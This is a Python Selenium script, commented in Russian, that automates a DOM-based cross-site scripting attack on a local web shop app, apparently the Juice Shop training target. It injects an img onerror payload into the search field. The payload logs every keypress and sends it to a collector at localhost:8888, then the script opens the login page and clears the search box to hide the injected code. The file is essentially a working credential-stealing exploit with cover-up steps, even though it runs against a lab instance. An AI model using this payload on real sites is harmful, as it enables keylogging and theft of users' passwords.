import time
from selenium import webdriver
from selenium.webdriver.common.by import By
import keyboard


browser = webdriver.Firefox()
browser.get('localhost:3000')
browser.set_window_size(768, 1248)

dismiss_button = browser.find_element(By.XPATH, "/html/body/div[3]/div[2]/div/mat-dialog-container/app-welcome-banner/div/div[2]/button[2]").click()
time.sleep(0.1)
search_field_extended_injection = browser.find_element(By.XPATH,"//*[@id=\"mat-input-0\"]").send_keys("<img src=x onerror='document.onkeypress=function(e){fetch(\"http://localhost:8888?k=\"+String.fromCharCode(e.which))},this.remove();'>")
time.sleep(0.1)
keyboard.send('enter')
time.sleep(0.1)
browser.get("http://localhost:3000/#/login")
time.sleep(0.1)
search_button = browser.find_element(By.XPATH, "/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-navbar/mat-toolbar/mat-toolbar-row/mat-search-bar/span/mat-icon[2]").click()
search_button_close = browser.find_element(By.XPATH, "/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-navbar/mat-toolbar/mat-toolbar-row/mat-search-bar/span/mat-icon[1]").click()

#dismiss_button - закрываем вкладку с информацией об сайте
#search_field_extended_injection - открываем развёрнутое окно поиска и вставляем нашу DOM-based xss с иньекцией javascript кода
#keyboard.send('enter') - нажатие клавиши enter
#browser.get("http://localhost:3000/#/login") - переходим на страницу логина
#search_button и search_button_close - нажимаем на кнопку поиска дважды чтобы стереть следы нашего кода в окне поиска

